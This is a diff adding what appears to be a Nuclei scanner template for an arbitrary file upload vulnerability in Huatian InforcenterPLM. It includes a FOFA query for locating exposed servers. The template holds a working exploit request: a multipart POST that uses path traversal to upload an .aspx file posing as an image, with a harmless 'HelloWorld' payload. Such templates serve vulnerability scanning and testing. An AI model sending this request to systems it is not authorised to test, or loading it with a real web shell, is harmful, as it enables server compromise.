@@ -1,0 +1,41 @@
+id: poc-xl5hx583gway2gtq
+info:
+  name: 华天InforcenterPLM uploadFileHttp存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xl5hx583gway2gtq'
+  tags: rce,file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xl5hx583gway2gtq
+    fofa: body="/Base/BaseHandler.ashx"
+http:
+- raw:
+  - 'POST /Base/BaseHandler.ashx?type=uploadFileHttp&uploadPath=../Files/ HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNxj6ATqxnclLfnCL
+
+    Accept: */*
+
+    Connection: close
+
+
+    ------WebKitFormBoundaryNxj6ATqxnclLfnCL
+
+    Content-Disposition: form-data; name="file"; filename="hello.aspx"
+
+    Content-Type: image/jpeg
+
+
+    <%= "HelloWorld" %>
+
+    ------WebKitFormBoundaryNxj6ATqxnclLfnCL--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
